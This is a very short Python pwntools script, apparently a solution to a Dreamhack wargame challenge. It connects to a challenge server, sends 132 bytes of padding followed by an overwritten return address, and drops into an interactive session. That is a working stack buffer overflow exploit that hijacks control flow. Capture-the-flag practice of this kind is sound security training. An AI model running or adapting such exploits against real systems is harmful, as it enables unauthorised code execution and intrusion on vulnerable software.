from pwn import *
p = remote("host8.dreamhack.games", 21716)
offset = 132
payload = b"A"*offset
payload += p32(0x080485b9)
p.sendline(payload)
p.interactive()
